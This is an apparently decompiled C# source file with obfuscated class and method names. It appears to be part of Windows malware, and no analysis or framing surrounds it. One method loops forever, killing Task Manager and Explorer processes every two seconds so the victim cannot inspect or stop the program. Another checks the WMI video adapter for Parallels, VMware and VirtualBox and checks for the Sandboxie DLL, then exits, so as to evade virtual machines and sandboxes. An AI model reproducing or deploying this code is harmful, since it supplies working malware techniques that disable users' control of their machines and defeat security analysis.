using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal class Class5
{
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	public unsafe static void smethod_0()
	{
		void* ptr = stackalloc byte[8];
		while (true)
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			*(int*)ptr = 0;
			while (*(int*)ptr < processesByName.Length)
			{
				Process process = processesByName[*(int*)ptr];
				process.Kill();
				checked
				{
					(*unchecked((int*)ptr))++;
				}
			}
			Process[] processesByName2 = Process.GetProcessesByName("explorer");
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < processesByName2.Length)
			{
				Process process2 = processesByName2[*(int*)((byte*)ptr + 4)];
				process2.Kill();
				checked
				{
					(*unchecked((int*)((byte*)ptr + 4)))++;
				}
			}
			Thread.Sleep(2000);
		}
	}

	public static void smethod_1()
	{
		if (Operators.CompareString(smethod_2(), "Parallels Video Adapter", false) == 0)
		{
			Environment.Exit(0);
		}
		else if (smethod_2().Contains("VMware"))
		{
			Environment.Exit(0);
		}
		else if (Operators.CompareString(smethod_2(), "VirtualBox Graphics Adapter", false) == 0)
		{
			Environment.Exit(0);
		}
		else if ((Operators.CompareString(smethod_2(), "VM Additions S3 Trio32/64", false) == 0) | (Operators.CompareString(smethod_2(), "S3 Trio32/64", false) == 0))
		{
			Environment.Exit(0);
		}
		else if (smethod_3())
		{
			Environment.Exit(0);
		}
	}

	private static string smethod_2()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
		try
		{
			enumerator = val.Get().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				result = Convert.ToString(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val2).get_Item("Description")));
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private static bool smethod_3()
	{
		bool result = default(bool);
		try
		{
			string string_ = "SbieDll.dll";
			if ((ulong)GetModuleHandleA(ref string_) > 0uL)
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
